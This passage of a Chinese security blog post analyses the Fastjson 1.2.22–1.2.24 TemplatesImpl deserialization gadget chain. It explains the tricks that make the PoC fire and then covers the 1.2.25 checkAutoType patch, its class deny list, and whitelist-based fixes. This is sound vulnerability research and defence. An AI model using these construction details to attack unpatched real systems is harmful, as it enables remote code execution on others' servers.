+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/17.png" alt="Fastjson%20TemplatesImpl/Untitled%2017.png"></p>
+<h2 id="PoC细节"><a href="#PoC细节" class="headerlink" title="PoC细节"></a>PoC细节</h2><blockquote>
+<p>接下来就是一些PoC构造的细节分析，直接决定了能否成功触发</p>
+</blockquote>
+<h3 id="1-bytecodes-为什么进行Base64编码-？"><a href="#1-bytecodes-为什么进行Base64编码-？" class="headerlink" title="1. _bytecodes 为什么进行Base64编码 ？"></a>1. _bytecodes 为什么进行Base64编码 ？</h3><p>Fastjson在调用<code>ObjectArrayCodec.deserialze</code> 中，调用<code>parser.parseArray</code>方法对字节数组进行解析</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/18.png" alt="Fastjson%20TemplatesImpl/Untitled%2018.png"></p>
+<p>获取反序列化器进行反序列化操作，在<code>lexer.bytesValue</code>会有一次Base64解码操作</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/19.png" alt="Fastjson%20TemplatesImpl/Untitled%2019.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/20.png" alt="Fastjson%20TemplatesImpl/Untitled%2020.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/21.png" alt="Fastjson%20TemplatesImpl/Untitled%2021.png"></p>
+<h3 id="2-this-sortedFieldDeserializers和this-extraFieldDeserializers两组List区别"><a href="#2-this-sortedFieldDeserializers和this-extraFieldDeserializers两组List区别" class="headerlink" title="2. this.sortedFieldDeserializers和this.extraFieldDeserializers两组List区别"></a>2. this.sortedFieldDeserializers和this.extraFieldDeserializers两组List区别</h3><p>先看下<code>FieldDeserializers</code> 是存放了各个属性的反序列化器，其中主要属性和方法：</p>
+<ul>
+<li><code>fieldInfo</code>存放属性名，属性getter/setter，Field对象等信息；</li>
+<li><code>clazz</code> 存放属性所属类的Class对象</li>
+<li><code>parseField()</code> 根据fieldType获取对应的fieldValueDeserilizer完成对属性值的反序列化 和 赋值操作</li>
+</ul>
+<ol>
+<li><p><strong>this.sortedFieldDeserializers</strong></p>
+<p><code>sortedFieldDeserializers</code>存放的属性主要来源于beanInfo，<strong>在beanInfo的build方法中会将setter/getter符合条件的FieldInfo增加到beanInfo.sortedFields中。</strong>其中的FieldInfo都包含了Method对象，最终都通过Method.invoke()进行赋值；</p>
+<blockquote>
+<p><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95">具体setter/getter条件见上篇文章</a></p>
+</blockquote>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/22.png" alt="Fastjson%20TemplatesImpl/Untitled%2022.png"></p>
+</li>
+<li><p><strong>this.extraFieldDeserializers</strong></p>
+</li>
+</ol>
+<p><code>extraFieldDeserializers</code> 会将<code>getDeclaredFields</code> 符合修饰符条件的Field增加进去。</p>
+<p>FieldInfo Method对象为空，最终都通过Field.set()进行赋值；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentHashMap extraFieldDeserializers = <span class="keyword">new</span> ConcurrentHashMap(<span class="number">1</span>, <span class="number">0.75F</span>, <span class="number">1</span>);</span><br><span class="line">	  Field[] fields = <span class="keyword">this</span>.clazz.getDeclaredFields();</span><br><span class="line">	  Field[] var11 = fields;</span><br><span class="line">	  <span class="keyword">int</span> var12 = fields.length;</span><br><span class="line">	</span><br><span class="line">	  <span class="keyword">for</span>(<span class="keyword">int</span> var13 = <span class="number">0</span>; var13 &lt; var12; ++var13) &#123;</span><br><span class="line">	      Field field = var11[var13];</span><br><span class="line">	      String fieldName = field.getName();</span><br><span class="line">	      <span class="keyword">if</span> (<span class="keyword">this</span>.getFieldDeserializer(fieldName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">	          <span class="keyword">int</span> fieldModifiers = field.getModifiers();</span><br><span class="line">	          <span class="keyword">if</span> ((fieldModifiers &amp; <span class="number">16</span>) == <span class="number">0</span> &amp;&amp; (fieldModifiers &amp; <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">	              extraFieldDeserializers.put(fieldName, field);</span><br><span class="line">	          &#125;</span><br><span class="line">	      &#125;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-为什么反序列化会调用getOutputProperties方法"><a href="#3-为什么反序列化会调用getOutputProperties方法" class="headerlink" title="3. 为什么反序列化会调用getOutputProperties方法"></a>3. 为什么反序列化会调用<code>getOutputProperties</code>方法</h3><blockquote>
+<p>outputProperties 关联 getOutputProperties</p>
+</blockquote>
+<p><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95">setter和getter的选择条件</a>，上篇已经提过在获取到Class所有的Fields和Methods后，会按照一些条件进行筛选，获取到<code>getOutputProperties</code> 方法，根据方法名获取属性名，将Method对象整理到FieldInfo，最终到了<code>sortedFieldDeserializers</code> 中</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/23.png" alt="Fastjson%20TemplatesImpl/Untitled%2023.png"></p>
+<h3 id="4-outputProperties为什么会关联调用getOutputProperties-方法"><a href="#4-outputProperties为什么会关联调用getOutputProperties-方法" class="headerlink" title="4. _outputProperties为什么会关联调用getOutputProperties 方法"></a>4. <code>_outputProperties</code>为什么会关联调用<code>getOutputProperties</code> 方法</h3><blockquote>
+<p>_outputProperties 处理为 outputProperties</p>
+</blockquote>
+<p>在<code>smartMatch</code>中会根据key值outputProperties从sortedFieldDeserializers中选择对应属性的反序列化器，第一轮未匹配到时，会自动去掉 <strong>“_”</strong> 再次获取</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/24.png" alt="Fastjson%20TemplatesImpl/Untitled%2024.png"></p>
+<p>最终在sortedFieldDeserializers中找到了问题3中关联的<code>getOutputProperties</code>方法</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/25.png" alt="Fastjson%20TemplatesImpl/Untitled%2025.png"></p>
+<h3 id="5-为什么要继承AbstractTranslet类-？"><a href="#5-为什么要继承AbstractTranslet类-？" class="headerlink" title="5. 为什么要继承AbstractTranslet类 ？"></a>5. 为什么要继承<code>AbstractTranslet</code>类 ？</h3><p><code>defineTransletClasses</code> 中会对bytecodes的类进行判断，父类为<code>AbstractTranslet</code>时会给transletIndex赋值为0，默认为-1，不是<code>AbstractTranslet</code>子类导致异常</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/26.png" alt="Fastjson%20TemplatesImpl/Untitled%2026.png"></p>
+<h1 id="安全修复"><a href="#安全修复" class="headerlink" title="安全修复"></a>安全修复</h1><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>根据<a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">官方公告</a>在1.2.25版本之后加入了黑白名单机制，这里跟进分析一下</p>
+<p>在DefaultJSONParser.parseObject中将加载类的<code>TypeUtils.loadClass</code>方法替换为了<code>this.config.checkAutoType()</code>方法</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/27.png" alt="Fastjson%20TemplatesImpl/Untitled%2027.png"></p>
+<p>1.2.25版本中默认情况下，autoTypeSupport为<code>false</code>，<strong>TemplatesImpl利用链会在进入到checkAutoType后被denyList中的黑名单匹配到抛出异常。</strong></p>
+<ul>
+<li><p><code>autoTypeSupport</code>为<code>false</code>，先过黑名单过滤，再过白名单过滤，若白名单匹配到就加载此类，否则会报错；这种情况下相对安全一些，黑白名单都未匹配的情况下，会抛出异常。</p>
+</li>
+<li><p><code>config.setAutoTypeSupport(true)</code>修改<code>autoTypeSupport</code>为<code>true</code>，先过白名单过滤，若白名单匹配到就加载此类，否则进入黑名单；这种情况下，如果黑白名单都未过滤，会被<code>TypeUtils.loadClass</code> 加载。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                String deny;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                    deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                    String accept;</span><br><span class="line">                    <span class="keyword">int</span> i;</span><br><span class="line">                    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                        accept = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                        accept = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">								<span class="comment">// 为true时，若白名单未过滤，黑名单未过滤，都会在这里完成类加载</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">								<span class="comment">// 为false时，若黑名单未过滤，白名单未过滤，在这里会抛出异常</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="1-2-25黑名单列表"><a href="#1-2-25黑名单列表" class="headerlink" title="1.2.25黑名单列表"></a>1.2.25黑名单列表</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">['bsh',</span><br><span class="line"> 'com.mchange',</span><br><span class="line"> 'com.sun.',</span><br><span class="line"> 'java.lang.Thread',</span><br><span class="line"> 'java.net.Socket',</span><br><span class="line"> 'java.rmi',</span><br><span class="line"> 'javax.xml',</span><br><span class="line"> 'org.apache.bcel',</span><br><span class="line"> 'org.apache.commons.beanutils',</span><br><span class="line"> 'org.apache.commons.collections.Transformer',</span><br><span class="line"> 'org.apache.commons.collections.functors',</span><br><span class="line"> 'org.apache.commons.collections4.comparators',</span><br><span class="line"> 'org.apache.commons.fileupload',</span><br><span class="line"> 'org.apache.myfaces.context.servlet',</span><br><span class="line"> 'org.apache.tomcat',</span><br><span class="line"> 'org.apache.wicket.util',</span><br><span class="line"> 'org.codehaus.groovy.runtime',</span><br><span class="line"> 'org.hibernate',</span><br><span class="line"> 'org.jboss',</span><br><span class="line"> 'org.mozilla.javascript',</span><br><span class="line"> 'org.python.core',</span><br><span class="line"> 'org.springframework']</span><br></pre></td></tr></table></figure>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
+<li><strong>1.2.28/1.2.29/1.2.30/1.2.31</strong>或者<strong>更新</strong>版本</li>
+<li>使用白名单过滤，避免黑名单被绕过</li>
+</ul>
+<h2 id="安全编码"><a href="#安全编码" class="headerlink" title="安全编码"></a>安全编码</h2><h3 id="添加autotype白名单"><a href="#添加autotype白名单" class="headerlink" title="添加autotype白名单"></a>添加autotype白名单</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 多个包名前缀，分多次addAccept</span></span><br><span class="line"><span class="number">1</span>. 代码中配置</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">"com.taobao.pac.client.sdk.dataobject."</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个包名前缀，用逗号隔开</span></span><br><span class="line"><span class="number">2</span>. JVM启动参数</span><br><span class="line">-Dfastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个包名前缀，用逗号隔开</span></span><br><span class="line"><span class="number">3</span>. fastjson.properties文件配置</span><br><span class="line">fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</span><br></pre></td></tr></table></figure>
+<h2 id="autotype功能"><a href="#autotype功能" class="headerlink" title="autotype功能"></a>autotype功能</h2><ul>
+<li>默认情况下基于白名单进行过滤，黑白名单都未过滤到时，会抛出异常</li>
+<li>打开后基于内置的黑名单实现检测，黑白名单未过滤到时，会被加载存在一定风险。后续Fastjson大多都是围绕黑名单绕过展开的。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JVM启动参数</span></span><br><span class="line">-Dfastjson.parser.autoTypeSupport=<span class="keyword">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码中配置</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="添加autotype黑名单"><a href="#添加autotype黑名单" class="headerlink" title="添加autotype黑名单"></a>添加autotype黑名单</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xx.xxx是包名前缀，如果有多个包名前缀，用逗号隔开</span></span><br><span class="line"><span class="number">1</span>. JVM启动参数</span><br><span class="line">-Dfastjson.parser.deny=xx.xxx</span><br><span class="line"></span><br><span class="line"><span class="comment">// xx.xxx是包名前缀，如果有多个包名前缀，用逗号隔开</span></span><br><span class="line"><span class="number">2</span>. fastjson.properties文件配置</span><br><span class="line">-Dfastjson.parser.deny=xx.xxx</span><br><span class="line"></span><br><span class="line"><span class="comment">// xx.xxx是包名前缀，如果有多个包名前缀，用逗号隔开</span></span><br><span class="line"><span class="number">3</span>. 代码中配置</span><br><span class="line">ParserConfig.getGlobalInstance().addDeny(<span class="string">"xx.xxx"</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>根据<a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">廖大神博客</a>提到的，由于<code>Feature.SupportNonPublicField</code> 是1.2.22版本引入，1.2.25加入了黑白名单机制，这个PoC作用版本就在1.2.22和1.2.24内。</p>
+<p>这篇主要分析了TemplatesImpI利用链，在这个版本后，Fastjson引入了黑白名单机制，之后的问题基本就都是和黑白名单斗智斗勇的时候了。下一篇分析JDBCRowSetlmpl利用链。</p>
+<h2 id="Logs"><a href="#Logs" class="headerlink" title="Logs"></a>Logs</h2><ul>
+<li><a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">Fastjson 1.2.24 2017年开始发现反序列化漏洞，官方发布升级公告</a></li>
+<li>Fastjson 1.2.25 加入黑白名单机制</li>
+<li>TemplatesImpI</li>
+<li>JDBCRowSetlmpl</li>
+<li>各类绕过黑名单</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></li>
+<li><a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</a></li>
+<li><a href="http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://drops.blbana.cc">BlBana</a>
+            <p>原文链接：<a href="http://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/">http://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/</a>
+            <p>发表日期：<a href="http://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/">April 1st 2020, 6:00:28 pm</a>
+            <p>更新日期：<a href="http://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/">April 2nd 2020, 12:57:50 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/30/Hexo-Google-Analytics/" title= "Hexo Google Analytics">
+                    <div class="prevTitle">Hexo Google Analytics</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify:false, 
+        verify:false, 
+        appId: "tEqAwsQl0o2KjbyKrV8L6CPd-gzGzoHsz",
+        appKey: "VlcSAqNhdr8z6ccGghmmPyVH",
+        placeholder: "Just Go Go",
+        path:window.location.pathname, 
+        avatar:'mm' 
+    });
+    </script>
+
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:blbana@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/blbana" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//www.zhihu.com/people/zhu-rong-ji-15/activities" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Hosted by <a href="https://pages.github.com/" target="_blank">Github Pages</a></span><span class="iconfont-archer power">&#xe635;</span>
+    </div>
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">悄悄到访者: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-TemplatesImpl-利用链"><span class="toc-number">1.</span> <span class="toc-text">Fastjson TemplatesImpl 利用链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#影响范围"><span class="toc-number">2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#限制条件"><span class="toc-number">3.1.</span> <span class="toc-text">限制条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-number">3.2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC分析"><span class="toc-number">3.3.</span> <span class="toc-text">PoC分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞详情"><span 